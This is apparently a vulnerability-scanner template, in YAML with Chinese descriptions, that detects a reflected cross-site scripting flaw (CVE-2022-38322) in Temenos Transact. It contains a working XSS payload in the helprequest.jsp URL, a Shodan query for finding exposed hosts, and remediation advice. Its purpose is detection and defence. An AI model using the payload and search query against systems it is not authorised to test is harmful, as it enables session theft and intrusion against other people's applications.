id: temenos-transact-xss

info:
  name: Temenos Transact - 跨站脚本漏洞（CVE-2022-38322）
  author: qotoz
  severity: high
  description: |
    该模板用于检测 Temenos Transact - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/jsps/helprequest.jsp?url=%27)%22+onerror=%22confirm(%27document.domain%27)%22` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://www.qotoz.com/posts/Temenos-Transact-XSS-CVE/
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.title:"transact sign in","t24 sign in"
  tags: temenos,transact,xss,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/jsps/helprequest.jsp?url=%27)%22+onerror=%22confirm(%27document.domain%27)%22"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - setupHelp('')" onerror="confirm('document.domain')

      - type: word
        part: content_type
        words:
          - 'text/html'

      - type: status
        status:
          - 200
